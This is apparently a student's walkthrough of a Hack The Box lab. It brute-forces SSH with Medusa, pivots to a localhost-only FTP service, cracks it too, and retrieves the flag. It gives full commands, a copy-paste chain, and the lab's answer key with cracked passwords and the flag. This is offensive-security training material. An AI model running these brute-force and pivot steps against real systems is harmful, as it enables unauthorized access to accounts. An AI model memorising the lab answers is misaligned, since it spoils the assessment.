# Section 10 — Web Services (SSH + FTP)

---

## Overview

This is a multi-stage attack. First brute-force SSH (Secure Shell) to get a foothold. Then pivot to attack an FTP (File Transfer Protocol) service running internally that isn't reachable from outside.

**Attack chain:**
```
Medusa → SSH creds → SSH session → discover FTP on localhost → Medusa → FTP creds → get flag
```

---

## Lab — SSH + FTP Brute Force

**Objective:** Crack SSH, get inside, find and crack a locally-running FTP server, retrieve flag.txt.

---

### Step 1 — Brute Force SSH

```bash
medusa -h TARGET_IP -n TARGET_PORT -u sshuser \
  -P ~/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
  -M ssh -t 3 -f
```
> Brute-forces SSH with a known username and a 200-password list. `-n` sets a non-default port. `-t 3` limits concurrent threads to avoid SSH rate-limiting or lockout. Replace `TARGET_IP`, `TARGET_PORT`, and `sshuser` with your target's values.

**Why `-t 3`:** SSH servers often rate-limit or block on too many concurrent connections. 3 threads is conservative and avoids lockout.

**Output:**
```
ACCOUNT FOUND: [ssh] Host: TARGET_IP  User: sshuser  Password: 1q2w3e4r5t [SUCCESS]
```

---

### Step 2 — SSH In and Discover Internal Services

```bash
ssh sshuser@TARGET_IP -p TARGET_PORT
```
> Logs in with the cracked credentials. `-p` sets the port if it's not the default 22.

Once in, check for listening services:

```bash
netstat -tulpn | grep LISTEN
# or
nmap localhost
```
> Lists all TCP and UDP ports currently listening on the machine. `-t` = TCP, `-u` = UDP, `-l` = listening only, `-p` = show the process name, `-n` = show numeric addresses. Port 21 here means FTP is running locally.

**What to look for:** Any open ports beyond 22. Port 21 = FTP running locally (not exposed externally).

Check `/home` for username hints:
```bash
ls /home
# ftpuser folder → username is likely ftpuser
```
> Lists home directories. Each folder name is likely a valid username on the system. Use these names for your next brute force.

---

### Step 3 — Brute Force FTP from Inside the SSH Session

```bash
medusa -h 127.0.0.1 -u ftpuser \
  -P ~/SecLists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt \
  -M ftp -t 5 -f
```
> Brute-forces FTP from inside the SSH session. Target is `127.0.0.1` because the FTP service is only reachable from localhost. Replace `ftpuser` and the wordlist path for your target.

**Why `127.0.0.1`:** The FTP service listens only on localhost. It is not reachable from the outside. You must attack it from inside the SSH session.
**Why `-t 5`:** FTP handles concurrent connections better than SSH.
**Why the 2020 list:** The module uses the 2020 variant — wordlist choice matters; if one list fails, try the other.

**Output:**
```
ACCOUNT FOUND: [ftp] Host: 127.0.0.1  User: ftpuser  Password: qqww1122 [SUCCESS]
```

---

### Step 4 — Retrieve the Flag via FTP

```bash
ftp -n 127.0.0.1 21 << 'EOF'
user ftpuser qqww1122
get flag.txt /tmp/flag.txt
bye
EOF
cat /tmp/flag.txt
```
> Non-interactive FTP session using a heredoc. `-n` disables automatic login so credentials can be passed inline. Downloads `flag.txt` to `/tmp/` then prints it. Replace the username and password with your cracked credentials.

**Why `ftp -n`:** `-n` disables auto-login so you can supply credentials manually in the heredoc — works non-interactively.

**Result:**
```
HTB{SSH_and_FTP_Bruteforce_Success}
```

**Q1 Answer (FTP password):** `qqww1122`
**Q2 Answer (flag):** `HTB{SSH_and_FTP_Bruteforce_Success}`

---

## Full Command Chain (Copy-Paste)

```bash
# 1. Crack SSH
medusa -h TARGET_IP -n TARGET_PORT -u sshuser \
  -P ~/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
  -M ssh -t 3 -f

# 2. SSH in and enumerate
ssh sshuser@TARGET_IP -p TARGET_PORT
netstat -tulpn | grep LISTEN
ls /home

# 3. Crack FTP (run from within SSH session)
medusa -h 127.0.0.1 -u ftpuser \
  -P ~/SecLists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt \
  -M ftp -t 5 -f

# 4. Get the flag (run from within SSH session)
ftp -n 127.0.0.1 21 << 'EOF'
user ftpuser PASSWORD
get flag.txt /tmp/flag.txt
bye
EOF
cat /tmp/flag.txt
```

---

## Exam Notes

- Always enumerate internal ports after getting a foothold — `netstat -tulpn` or `nmap localhost`
- Check `/home` directory for folder names → reveals likely usernames for internal services
- FTP on localhost = common pattern in labs and real environments (internal file server not meant to be public)
- If `curl` isn't available on the target, use `ftp -n` with a heredoc for non-interactive file retrieval
- SSH brute force is slow due to the protocol — keep `-t` low (3–5) to avoid bans
